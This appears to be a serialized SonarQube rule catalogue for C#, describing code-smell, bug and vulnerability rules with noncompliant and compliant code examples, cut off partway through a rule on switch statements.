csharpsquidS1481(Unused local variables should be removed"MINOR*cs:ê<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int NumberOfMinutes(int hours)
{
  int seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int NumberOfMinutes(int hours)
{
  return hours * 60;
}
</pre>
<h2>Exceptions</h2>
<p>Unused locally created resources in a <code>using</code> statement are not reported.</p>
<pre>
using(var t = new TestTimer()) // t never used, but compliant.
{
  //...
}
</pre>Z
CODE_SMELL
ﬂ

csharpsquid:S2148…

csharpsquidS21489Underscores should be used to make large numbers readable"MINOR*cs:‡	<p>Beginning with C# 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this manner
has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>C# version</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>Z
CODE_SMELL
 
csharpsquid:S3235¥
csharpsquidS3235(Redundant parentheses should not be used"MINOR*cs:‹<p>Redundant parentheses are simply wasted keystrokes, and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[MyAttribute()] //Noncompliant
class MyClass
{
  public int MyProperty { get; set; }
  public static MyClass CreateNew(int propertyValue)
  {
    return new MyClass() //Noncompliant
    {
      MyProperty = propertyValue
    };
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[MyAttribute]
class MyClass
{
  public int MyProperty { get; set; }
  public static MyClass CreateNew(int propertyValue)
  {
    return new MyClass
    {
      MyProperty = propertyValue
    };
  }
}
</pre>Z
CODE_SMELL
¸
csharpsquid:S3236Ê
csharpsquidS3236>Caller information arguments should not be provided explicitly"MINOR*cs:¯<p>Caller information attributes: <code>CallerFilePathAttribute</code> and <code>CallerLineNumberAttribute</code> provide a way to get information
about the caller of a method through optional parameters. But the arguments for these optional parameters are only generated if they are not
explicitly defined in the call. Thus, specifying the argument values defeats the purpose of the attributes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void TraceMessage(string message,
  [CallerFilePath] string filePath = null,
  [CallerLineNumber] int lineNumber = 0)
{
  /* ... */
}

void MyMethod()
{
  TraceMessage("my message", "A.B.C.Foo.cs", 42); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void TraceMessage(string message,
  [CallerFilePath] string filePath = "",
  [CallerLineNumber] int lineNumber = 0)
{
  /* ... */
}

void MyMethod()
{
  TraceMessage("my message");
}
</pre>
<h2>Exceptions</h2>
<p><code>CallerMemberName</code> is not checked to avoid False-Positives with WPF/UWP applications.</p>Z
CODE_SMELL
œ
csharpsquid:S2386π
csharpsquidS2386,Mutable fields should not be "public static""MINOR*cs:⁄<p><code>public static</code> mutable fields of classes which are accessed directly should be protected to the degree possible. This can be done by
reducing the accessibility of the field or by changing the return type to an immutable type.</p>
<p>This rule raises issues for <code>public static</code> fields with a type inheriting/implementing <code>System.Array</code> or
<code>System.Collections.Generic.ICollection&lt;T&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class A
{
  public static string[] strings1 = {"first","second"};  // Noncompliant
  public static List&lt;String&gt; strings3 = new List&lt;String&gt;();  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class A
{
  protected static string[] strings1 = {"first","second"};
  protected static List&lt;String&gt; strings3 = new List&lt;String&gt;();
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported:</p>
<ul>
  <li> If the type of the field inherits/implements one (at least) of the following types:
    <ul>
      <li> <code>System.Collections.ObjectModel.ReadOnlyCollection&lt;T&gt;</code> </li>
      <li> <code>System.Collections.ObjectModel.ReadOnlyDictionary&lt;TKey, TValue&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableArray&lt;T&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableDictionary&lt;TKey, TValue&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableList&lt;T&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableSet&lt;T&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableStack&lt;T&gt;</code> </li>
      <li> <code>System.Collections.Immutable.IImmutableQueue&lt;T&gt;</code> </li>
    </ul> </li>
  <li> If the field is <code>readonly</code> and is initialized inline with an immutable type (i.e. inherits/implements one of the types in the
  previous list) or null. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/rwBc">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JQLEAw">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed
  </li>
</ul>ZVULNERABILITY
›
csharpsquid:S3234«
csharpsquidS3234I"GC.SuppressFinalize" should not be invoked for types without destructors"MINOR*cs:Œ<p><code>GC.SuppressFinalize</code> asks the Common Language Runtime not to call the finalizer of an object. This is useful when implementing the
dispose pattern where object finalization is already handled in <code>IDisposable.Dispose</code>. However, it has no effect if there is no finalizer
defined in the object's type, so using it in such cases is just confusing.</p>
<p>This rule raises an issue when <code>GC.SuppressFinalize</code> is called for objects of <code>sealed</code> types without a finalizer.</p>
<p><strong></strong>Note:** <a href='/coding_rules#rule_key=csharpsquid%3AS3971'>S3971</a> is a stricter version of this rule. Typically it makes sense to activate only one of these 2
rules.</p>
<h2>Noncompliant Code Example</h2>
<pre>
sealed class MyClass
{
  public void Method()
  {
    ...
    GC.SuppressFinalize(this); //Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
sealed class MyClass
{
  public void Method()
  {
    ...
  }
}
</pre>Z
CODE_SMELL
ö
csharpsquid:S4201Ñ
csharpsquidS4201(Null checks should not be used with "is""MINOR*cs:¨<p>There's no need to null test in conjunction with an <code>is</code> test. <code>null</code> is not an instance of anything, so a null check is
redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != null &amp;&amp; x is MyClass) { ... }  // Noncompliant

if (x == null || !(x is MyClass)) { ... } // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x is MyClass) { ... }

if (!(x is MyClass)) { ... }
</pre>Z
CODE_SMELL
Ä

csharpsquid:S1858Í	
csharpsquidS1858*"ToString()" calls should not be redundant"MINOR*cs:ê	<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. Similarly, explicitly
invoking <code>ToString()</code> when the compiler would do it implicitly is also needless code-bloat.</p>
<p>This rule raises an issue when <code>ToString()</code> is invoked:</p>
<ul>
  <li> on a <code>string</code> </li>
  <li> on a non-<code>string</code> operand to concatenation </li>
  <li> on an argument to <code>string.Format</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var s = "foo";
var t = "fee fie foe " + s.ToString();  // Noncompliant
var someObject = new object();
var u = "" + someObject.ToString(); // Noncompliant
var v = string.Format("{0}", someObject.ToString()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var s = "foo";
var t = "fee fie foe " + s;
var someObject = new object();
var u = "" + someObject;
var v = string.Format("{0}", someObject);
</pre>
<h2>Exceptions</h2>
<p>The rule does not report on value types, where leaving off the <code>ToString()</code> call would result in automatic boxing.</p>
<pre>
var v = string.Format("{0}", 1.ToString());
</pre>Z
CODE_SMELL
Ö
csharpsquid:S3247Ô
csharpsquidS3247"Duplicate casts should not be made"MINOR*cs:ù<p>Because the <code>is</code> operator performs a cast if the object is not null, using <code>is</code> to check type and then casting the same
argument to that type, necessarily performs two casts. The same result can be achieved more efficiently with a single cast using <code>as</code>,
followed by a null-check.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x is Fruit)  // Noncompliant
{
  var f = (Fruit)x; // or x as Fruit
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var f = x as Fruit;
if (f != null)
{
  // code
}
</pre>Z
CODE_SMELL
”
csharpsquid:S2156Ω
csharpsquidS21564"sealed" classes should not have "protected" members"MINOR*cs:Ÿ<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>sealed</code> class cannot have children, marking its members
<code>protected</code> is confusingly pointless.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public sealed class MySealedClass
{
    protected string name = "Fred";  // Noncompliant
    protected void SetName(string name) // Noncompliant
    {
        // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public sealed class MySealedClass
{
    private string name = "Fred";
    public void SetName(string name)
    {
        // ...
    }
}
</pre>Z
CODE_SMELL
˙
csharpsquid:S3242‰
csharpsquidS32424Method parameters should be declared with base types"MINOR*cs:Ä<p>When a derived type is used as a parameter instead of the base type, it limits the uses of the method. If the additional functionality that is
provided in the derived type is not requires then that limitation isn't required, and should be removed.</p>
<p>This rule raises an issue when a method declaration includes a parameter that is a derived type and accesses only members of the base type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.IO;

namespace MyLibrary
{
  public class Foo
  {
    public void ReadStream(FileStream stream) // Noncompliant: Uses only System.IO.Stream methods
    {
      int a;
      while ((a = stream.ReadByte()) != -1)
      {
            // Do something.
      }
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.IO;

namespace MyLibrary
{
  public class Foo
  {
    public void ReadStream(Stream stream)
    {
      int a;
      while ((a = stream.ReadByte()) != -1)
      {
            // Do something.
      }
    }
  }
}
</pre>Z
CODE_SMELL
˚
csharpsquid:S1185Â
csharpsquidS1185TOverriding members should do more than simply call the same member in the base class"MINOR*cs:·
<p>Overriding a method just to call the same method from the base class without performing any other actions is useless and misleading. The only time
this is justified is in <code>sealed</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores overrides
of <code>Equals</code> and <code>GetHashCode</code>.</p>
<p>NOTE: In some cases it might be dangerous to add or remove empty overrides, as they might be breaking changes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public override void Method() // Noncompliant
{
  base.Method();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public override void Method()
{
  //do something else
}
</pre>
<h2>Exceptions</h2>
<p>If there is an attribute in any level of the overriding chain, then the overridden member is ignored.</p>
<pre>
public class Base
{
  [Required]
  public virtual string Name { get; set; }
}

public class Derived : Base
{
  public override string Name
  {
    get
    {
      return base.Name;
    }
    set
    {
      base.Name = value;
    }
  }
}
</pre>
<p>If there is a documentation comment on the overriding method, it will be ignored:</p>
<pre>
public class Foo : Bar
{
    /// &lt;summary&gt;
    /// Keep this method for backwards compatibility.
    /// &lt;/summary&gt;
    public override void DoSomething()
    {
        base.DoSomething();
    }
}
</pre>Z
CODE_SMELL
ÿ
csharpsquid:S2955¬
csharpsquidS2955VGeneric parameters not constrained to reference types should not be compared to "null""MINOR*cs:√<p>When constraints have not been applied to restrict a generic type parameter to be a reference type, then a value type, such as a
<code>struct</code>, could also be passed. In such cases, comparing the type parameter to <code>null</code> would always be false, because a
<code>struct</code> can be empty, but never <code>null</code>. If a value type is truly what's expected, then the comparison should use
<code>default()</code>. If it's not, then constraints should be added so that no value type can be passed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private bool IsDefault&lt;T&gt;(T value)
{
  if (value == null) // Noncompliant
  {
    // ...
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private bool IsDefault&lt;T&gt;(T value)
{
  if(object.Equals(value, default(T)))
  {
    // ...
  }
  // ...
}
</pre>
<p>or</p>
<pre>
private bool IsDefault&lt;T&gt;(T value) where T : class
{
  if (value == null)
  {
    // ...
  }
  // ...
}
</pre>ZBUG
„
csharpsquid:S3240Õ
csharpsquidS32405The simplest possible condition syntax should be used"MINOR*cs:Ë<p>In the interests of keeping code clean, the simplest possible conditional syntax should be used. That means </p>
<ul>
  <li> using the <code>??</code> operator for an assign-if-not-null operator, </li>
  <li> using the ternary operator <code>?:</code> for assignment to a single variable, and </li>
  <li> removing the <code>??</code> when the left operand is known to be <code>null</code>, or known to be definitely not <code>null</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
object a = null, b = null, x;

if (a != null) // Noncompliant; needlessly verbose
{
  x = a;
}
else
{
  x = b;
}

x = a != null ? a : b; // Noncompliant; better but could still be simplified

x = (a == null) ? new object() : a; // Noncompliant

if (condition) // Noncompliant
{
  x = a;
}
else
{
  x = b;
}

var y = null ?? new object(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
object x;

x = a ?? b;
x = a ?? b;
x = a ?? new object();
x = condition ? a : b;
var y = new object();
</pre>Z
CODE_SMELL
ò
csharpsquid:S3241Ç
csharpsquidS32414Methods should not return values that are never used"MINOR*cs:û<p>Private methods are clearly intended for use only within their own scope. When such methods return values that are never used by any of their
callers, then clearly there is no need to actually make the return, and it should be removed in the interests of efficiency and clarity. </p>Z
CODE_SMELL
ó
csharpsquid:S3458Å
csharpsquidS3458IEmpty "case" clauses that fall through to the "default" should be omitted"MINOR*cs:à<p>Empty <code>case</code> clauses that fall through to the default are useless. Whether or not such a <code>case</code> is present, the
<code>default</code> clause will be invoked. Such <code>case</code>s simply clutter the code, and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch(ch)
{
  case 'a' :
    HandleA();
    break;
  case 'b' :
    HandleB();
    break;
  case 'c' :  // Noncompliant
  default:
    HandleTheRest();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch(ch)
{
  case 'a' :
    HandleA();
    break;
  case 'b' :
    HandleB();
    break;
  default:
    HandleTheRest();
    break;
}
</pre>Z
CODE_SMELL
∏
csharpsquid:S1155¢
csharpsquidS1155,"Any()" should be used to test for emptiness"MINOR*cs:∆<p>Using <code>.Count()</code> to test for emptiness works, but using <code>.Any()</code> makes the intent clearer, and the code more readable.
However, there are some cases where special attention should be paid:</p>
<p>- if the collection is an <code>EntityFramework</code> or other ORM query, calling <code>.Count()</code> will cause executing a potentially massive
SQL query and could put a large overhead on the application database. Calling <code>.Any()</code> will also connect to the database, but will generate
much more efficient SQL.</p>
<p>- if the collection is part of a LINQ query that contains <code>.Select()</code> statements that create objects, a large amount of memory could be
unnecessarily allocated. Calling <code>.Any()</code> will be much more efficient because it will execute fewer iterations of the enumerable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private static bool HasContent(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() &gt; 0;  // Noncompliant
}

private static bool HasContent2(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() &gt;= 1;  // Noncompliant
}

private static bool IsEmpty(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() == 0;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static bool HasContent(IEnumerable&lt;string&gt; strings)
{
  return strings.Any();
}

private static bool IsEmpty(IEnumerable&lt;string&gt; strings)
{
  return !strings.Any();
}
</pre>Z
CODE_SMELL
™
csharpsquid:S3456î
csharpsquidS34567"string.ToCharArray()" should not be called redundantly"MINOR*cs:¥<p><code>ToCharArray</code> can be omitted when the operation on the array could have been done directly on the string, such as when iterating over
the characters in a string, and when accessing a character in a string via an array index. In those cases, explicit <code>ToCharArray</code> calls
should be omitted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string str = "some string";
foreach (var c in str.ToCharArray()) // Noncompliant
{
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string str = "some string";
foreach (var c in str)
{
  // ...
}
</pre>ZBUG
Â
csharpsquid:S3459œ
csharpsquidS3459$Unassigned members should be removed"MINOR*cs:˚<p>Fields and auto-properties that are never assigned to hold the default values for their types. They are either pointless code or, more likely,
mistakes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  private int field; // Noncompliant, shouldn't it be initialized? This way the value is always default(int), 0.
  private int Property { get; set; }  // Noncompliant
  public void Print()
  {
    Console.WriteLine(field); //Will always print 0
    Console.WriteLine(Property); //Will always print 0
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  private int field = 1;
  private int Property { get; set; } = 42;
  public void Print()
  {
    field++;
    Console.WriteLine(field);
    Console.WriteLine(Property);
  }
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S3450Ë
csharpsquidS3450WParameters with "[DefaultParameterValue]" attributes should also be marked "[Optional]""MINOR*cs:·<p>There is no point in providing a default value for a parameter if callers are required to provide a value for it anyway. Thus,
<code>[DefaultParameterValue]</code> should always be used in conjunction with <code>[Optional]</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void MyMethod([DefaultParameterValue(5)] int j) //Noncompliant, useless
{
  Console.WriteLine(j);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void MyMethod(int j = 5)
{
  Console.WriteLine(j);
}
</pre>
<p>or</p>
<pre>
public void MyMethod([DefaultParameterValue(5)][Optional] int j)
{
  Console.WriteLine(j);
}
</pre>Z
CODE_SMELL
π
csharpsquid:S3220£
csharpsquidS3220FMethod calls should not resolve ambiguously to overloads with "params""MINOR*cs:≠<p>The rules for method resolution are complex and perhaps not properly understood by all coders. The <code>params</code> keyword can make method
declarations overlap in non-obvious ways, so that slight changes in the argument types of an invocation can resolve to different methods.</p>
<p>This rule raises an issue when an invocation resolves to a method declaration with <code>params</code>, but could also resolve to another
non-<code>params</code> method too.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
    private void Format(string a, params object[] b) { }

    private void Format(object a, object b, object c) { }
}

// ...
MyClass myClass = new MyClass();

myClass.Format("", null, null); // Noncompliant, resolves to the first Format with params, but was that intended?
</pre>Z
CODE_SMELL
ﬁ
csharpsquid:S2934»
csharpsquidS2934`Property assignments should not be made for "readonly" fields not constrained to reference types"MINOR*cs:ø<p>While the properties of a <code>readonly</code> reference type field can still be changed after initialization, those of a <code>readonly</code>
value field, such as a <code>struct</code>, cannot. </p>
<p>If the member could be either a <code>class</code> or a <code>struct</code> then assignment to its properties could be unreliable, working
sometimes but not others.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T: IPoint
{
  readonly T point;  // this could be a struct
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX)
  {
    point.X = newX; //Noncompliant; if point is a struct, then nothing happened
    Console.WriteLine(point.X);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T : IPoint
{
  readonly T point;  // this could be a struct
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX) // assignment has been removed
  {
    Console.WriteLine(point.X);
  }
}
</pre>
<p>or</p>
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T : class, IPoint
{
  readonly T point;  // this can only be a class
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX)
  {
    point.X = newX;  // this assignment is guaranteed to work
    Console.WriteLine(point.X);
  }
}
</pre>ZBUG
Ø
csharpsquid:S818ö
csharpsquidS818%Literal suffixes should be upper case"MINOR*cs:∆<p>Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const long b = 0l;      // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const long b = 0L;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C.</a> - Use "L," not "l," to indicate a long value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
•
csharpsquid:S3397è
csharpsquidS3397f"base.Equals" should not be used to check for reference equality in "Equals" if "base" is not "object""MINOR*cs:Ä<p><code>object.Equals()</code> overrides can be optimized by checking first for reference equality between <code>this</code> and the parameter. This
check can be implemented by calling <code>object.ReferenceEquals()</code> or <code>base.Equals()</code>, where <code>base</code> is
<code>object</code>. However, using <code>base.Equals()</code> is a maintenance hazard because while it works if you extend <code>Object</code>
directly, if you introduce a new base class that overrides <code>Equals</code>, it suddenly stops working.</p>
<p>This rule raises an issue if <code>base.Equals()</code> is used but <code>base</code> is not <code>object</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  private int baseField;

  public override bool Equals(object other)
  {
    if (base.Equals(other)) // Okay; base is object
    {
      return true;
    }

    return this.baseField == ((Base)other).baseField;
  }
}

class Derived : Base
{
  private int derivedField;

  public override bool Equals(object other)
  {
    if (base.Equals(other))  // Noncompliant
    {
      return true;
    }

    return this.derivedField == ((Derived)other).derivedField;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Base
{
  private int baseField;

  public override bool Equals(object other)
  {
    if (object.ReferenceEquals(this, other))  // base.Equals is okay here, but object.ReferenceEquals is better
    {
      return true;
    }

    return this.baseField == ((Base)other).baseField;
  }
}

class Derived : Base
{
  private int derivedField;

  public override bool Equals(object other)
  {
    if (object.ReferenceEquals(this, other))
    {
      return true;
    }

    return base.Equals(other) &amp;&amp; this.derivedField == ((Derived)other).derivedField;
  }
}
</pre>ZBUG
¬
csharpsquid:S1659¨
csharpsquidS1659:Multiple variables should not be declared on the same line"MINOR*cs:¬<p>Declaring multiple variable on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  private int a, b; // Noncompliant

  public void Method()
  {
    int c, d; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  private int a;
  private int b;

  public void Method()
  {
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7wHEAw">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VgU">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>Z
CODE_SMELL
ö
csharpsquid:S3717Ñ
csharpsquidS3717&Track use of "NotImplementedException""MINOR*cs:Æ<p><code>NotImplementedException</code> is often used to mark methods which must be implemented for the overall functionality to be complete, but
which the developer wants to implement later. That's as opposed to the <code>NotSupportedException</code> which is thrown by methods which are
required by base classes or interfaces, but which are not appropriate to the current class.</p>
<p>This rule raises an exception when <code>NotImplementedException</code> is thrown.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doTheThing()
{
    throw new NotImplementedException();
}
</pre>
<h2>Exceptions</h2>
<p>Exceptions derived from <code>NotImplementedException</code> are ignored.</p>Z
CODE_SMELL
·
csharpsquid:S2184À
csharpsquidS2184NResults of integer division should not be assigned to floating point variables"MINOR*cs:‘<p>When division is performed on <code>int</code>s, the result will always be an <code>int</code>. You can assign that result to a
<code>double</code>, <code>float</code> or <code>decimal</code> with automatic type conversion, but having started as an <code>int</code>, the result
will likely not be what you expect. If the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost
before the assignment. Instead, at least one operand should be cast or promoted to the final type before the operation takes place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static void Main()
{
  decimal dec = 3/2; // Noncompliant
  Method(3/2); // Noncompliant
}

static void Method(float f) { }
</pre>
<h2>Compliant Solution</h2>
<pre>
static void Main()
{
  decimal dec = (decimal)3/2;
  Method(3.0F/2);
}

static void Method(float f) { }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/190">MITRE, CWE-190</a> - Integer Overflow or Wraparound </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/woIyAQ">CERT, NUM50-J.</a> - Convert integers to floating point for floating-point
  operations </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AxE">CERT, INT18-C.</a> - Evaluate integer expressions in a larger size before
  comparing or assigning to that size </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
</ul>ZBUG
•
csharpsquid:S105ê
csharpsquidS105(Tabulation characters should not be used"MINOR*cs:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
Û
csharpsquid:S2183›
csharpsquidS2183RIntegral numbers should not be shifted by zero or more than their number of bits-1"MINOR*cs:‚<p>Shifting an integral number by 0 is equivalent to doing nothing but makes the code confusing for maintainers.</p>
<p>If the first operand is an <code>int</code> or <code>uint</code> (32-bit quantity), the shift count is given by the low-order five bits of the
second operand. That is, the actual shift count is 0 to 31 bits.</p>
<p>Note that integral number with a less than 32-bit quantity (e.g. <code>short</code>, <code>ushort</code>...) are implicitly converted to
<code>int</code> before the shifting operation and so the rule for <code>int</code>/<code>uint</code> applies.</p>
<p>If the first operand is a <code>long</code> or <code>ulong</code> (64-bit quantity), the shift count is given by the low-order six bits of the
second operand. That is, the actual shift count is 0 to 63 bits.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = (short)(s &lt;&lt; 0); // Noncompliant
    short shortShift1 = (short)(s &lt;&lt; 16); // Compliant as short will be cast to int (16 is between 0 and 31)
    short shortShift3 = (short)(s &lt;&lt; 32); // Noncompliant, this is equivalent to shifting by 1

    int i = 1;
    int intShift1 = i &lt;&lt; 0; // Noncompliant
    int intShift2 = i &lt;&lt; 32; // Noncompliant, this is equivalent to shifting by 1

    long lg = 1;
    long longShift1 = lg &lt;&lt; 0; // Noncompliant
    long longShift2 = lg &lt;&lt; 64; // Noncompliant, this is equivalent to shifting by 1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = s;
    short shortShift1 = (short)(s &lt;&lt; 16);
    short shortShift3 = (short)(s &lt;&lt; 1);

    int i = 1;
    var intShift1 = i;
    var intShift2 = i &lt;&lt; 1;

    long lg = 1;
    var longShift1 = lg;
    var longShift2 = lg &lt;&lt; 1;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/left-shift-operator">MSDN Left-shift operator</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/right-shift-operator">MSDN Right-shift operator</a> </li>
</ul>ZBUG
ƒ
csharpsquid:S3963Æ
csharpsquidS3963,"static" fields should be initialized inline"MINOR*cs:“<p>When a <code>static</code> constructor serves no other purpose that initializing <code>static</code> fields, it comes with an unnecessary
performance cost because the compiler generates a check before each <code>static</code> method or instance constructor invocation.</p>
<p>Instead, inline initialization is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace myLib
{
  public class Foo
  {
    static int i;
    static string s;

    static Foo() // Noncompliant
    {
      i = 3;
      ResourceManager sm =  new ResourceManager("strings", Assembly.GetExecutingAssembly());
      s = sm.GetString("mystring");
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace myLib
{
  public class Foo
  {
    static int i =3;
    static string s = InitString();

    static string InitString()
    {
      ResourceManager sm = new ResourceManager("strings", Assembly.GetExecutingAssembly());
      return sm.GetString("mystring");
    }
  }
}
</pre>Z
CODE_SMELL
†
csharpsquid:S4018ä
csharpsquidS4018.Generic methods should provide type parameters"MINOR*cs:¨<p>The best way to determine the type of a generic method is by inference based on the type of argument that is passed to the method. This is not
possible when a parameter type is missing from the argument list.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void MyMethod&lt;T&gt;()  // Noncompliant
    {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void MyMethod&lt;T&gt;(T param)
    {
    }
  }
}
</pre>Z
CODE_SMELL
ˆ
csharpsquid:S1301‡
csharpsquidS13019"switch" statements should have at least 3 "case" clauses"MINOR*cs:˜<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable)
{
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0)
{
  doSomething();
}
else
{
